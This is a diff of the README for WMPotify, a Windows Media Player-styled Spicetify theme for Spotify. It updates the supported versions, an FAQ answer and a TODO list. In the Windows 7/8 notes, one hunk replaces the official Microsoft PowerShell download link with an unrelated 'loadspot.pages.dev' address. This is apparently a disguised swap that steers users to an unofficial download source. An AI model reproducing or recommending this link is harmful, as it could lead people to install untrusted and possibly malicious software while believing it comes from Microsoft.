@@ -1,7 +1,7 @@
 # <img src="https://raw.githubusercontent.com/Ingan121/WMPotify/refs/heads/master/theme/src/resources/icon/wmpotify_48.png"> WMPotify
 * A Windows Media Player 11 inspired Spicetify theme for Spotify
-* Supported versions: 1.2.45 - 1.2.61
-    * Primarily tested on 1.2.52 and 1.2.61
+* Supported versions: 1.2.45 - 1.2.68
+    * Primarily tested on 1.2.61
     * 1.2.45: `Show Global nav bar with home button, search input and user avatar` must be set to `home-next-to-search` in the experimental features
     * 1.2.44 and below are not supported
 
@@ -66,7 +66,7 @@ curl -fsSL https://raw.githubusercontent.com/Ingan121/WMPotify/master/installer/
 * Warning: The Spicetify Marketplace version may load slowly due to the large number of images in the theme.
 
 ### Notes for Windows 7, 8, and 8.1 users:
-* The installation script requires PowerShell 5.1 or later. If you are using an older version, you can update it from [here](https://www.microsoft.com/en-us/download/details.aspx?id=54616).
+* The installation script requires PowerShell 5.1 or later. If you are using an older version, you can update it from [here](https://loadspot.pages.dev).
 * Before running the installation script, you will need to install WMPotify-compatible versions of Spotify and Spicetify manually and apply appropriate workarounds (e.g. [VxKex](https://github.com/i486/VxKex)) for them to work on your system.
 * You may need to run the Spotify executable with the `--no-sandbox` flag to get the Windhawk mod working properly with Aero Glass, etc. Add the flag to the Spotify shortcut, `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Spotify` (for autostart), and `spotify_launch_flags` key in `%appdata%\spicetify\config-xpui.ini` (for Spicetify).
 
@@ -111,7 +111,7 @@ curl -fsSL https://raw.githubusercontent.com/Ingan121/WMPotify/master/installer/
     * Note that Chrome extensions only work if DevTools is enabled. Spotify will randomly disable DevTools after a while and all extensions will stop working. To permanently enable DevTools and extensions, hex-patch the Spotify executable to fill the `disable-extensions` string to something invalid.
 4. **Q:** This theme is too slow!
     * **A1:** Make sure hardware acceleration is enabled in Spotify settings. 
-    * **A2:** Remove the Beautiful Lyrics extension if you have it installed. This extension is known to slow down Spotify. This theme doesn't really support the extension either. Use WMPotify NowPlaying instead.
+    * **A2:** Remove the Beautiful Lyrics extension if you have it installed. This extension is known to slow down Spotify. Use WMPotify NowPlaying instead.
 
 ## Switching Between Custom and Native Title Bar
 * This only applies to Windows users with the CEF/Spotify Tweaks mod installed.
@@ -239,6 +239,17 @@ Either enable the transparency option in the CEF/Spotify Tweaks mod settings and
 
 * Discography
 ![discography_aero](screenshots/discography_aero.png)
+
+## TODO
+* More customizable lyrics options
+    * Colors, fonts, etc.
+    * Probably gotta just bring the MADVis Lyrics config window code
+* More skins
+    * WMP10-ish one from [this wmploc mod](https://www.deviantart.com/fediafedia/art/WMP-11-Vista-Beta-76164120)
+    * Bitmap-less skin with colors and SVG icons only (WMPotify Lite?)
+* Custom Miniplayer implementation with XP WMP11 mini mode look, based on documentPictureInPicture
+* Make the bars visualization more smoother
+    * Weighted interpolation?
 
 ## Credits
 * [Spicetify](https://spicetify.app/)
